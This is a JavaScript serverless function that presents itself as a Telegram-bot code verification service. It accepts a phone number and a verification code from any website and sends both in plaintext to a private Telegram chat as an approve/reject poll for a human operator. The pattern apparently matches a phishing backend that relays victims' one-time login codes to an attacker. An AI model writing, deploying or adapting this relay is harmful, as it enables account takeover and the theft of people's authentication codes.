// Vercel serverless function for code verification via Telegram bot with poll
export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { phoneNumber, verificationCode } = req.body;

    if (!phoneNumber || !verificationCode) {
      return res.status(400).json({ error: 'Phone number and verification code are required' });
    }

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('Missing Telegram credentials');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    // Send poll to Telegram
    const pollMessage = `Code verification request:\n📱 Phone: ${phoneNumber}\n🔐 Code: ${verificationCode}`;
    
    const pollResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPoll`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        question: pollMessage,
        options: ['✅ Approve', '❌ Reject'],
        is_anonymous: false,
        allows_multiple_answers: false
      })
    });

    if (!pollResponse.ok) {
      throw new Error('Failed to send poll to Telegram');
    }

    const pollData = await pollResponse.json();
    const pollId = pollData.result.poll.id;

    // Store the verification request with poll ID (in a real app, use a database)
    // For now, we'll simulate waiting for the poll result
    
    // Wait for poll response (in production, use webhooks or polling)
    // For demo purposes, we'll check for updates after a short delay
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Get updates to check poll results
    const updatesResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
    const updatesData = await updatesResponse.json();
    
    let approved = false;
    
    // Check if there's a poll answer in recent updates
    if (updatesData.ok && updatesData.result.length > 0) {
      const recentUpdates = updatesData.result.slice(-5); // Check last 5 updates
      
      for (const update of recentUpdates) {
        if (update.poll_answer && update.poll_answer.poll_id === pollId) {
          // Option 0 = Approve, Option 1 = Reject
          approved = update.poll_answer.option_ids.includes(0);
          break;
        }
      }
    }

    // If no poll answer found, return pending status
    if (!approved && !updatesData.result.some(u => u.poll_answer?.poll_id === pollId)) {
      return res.status(202).json({ 
        status: 'pending',
        message: 'Waiting for approval...',
        pollId: pollId
      });
    }

    res.status(200).json({ approved });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}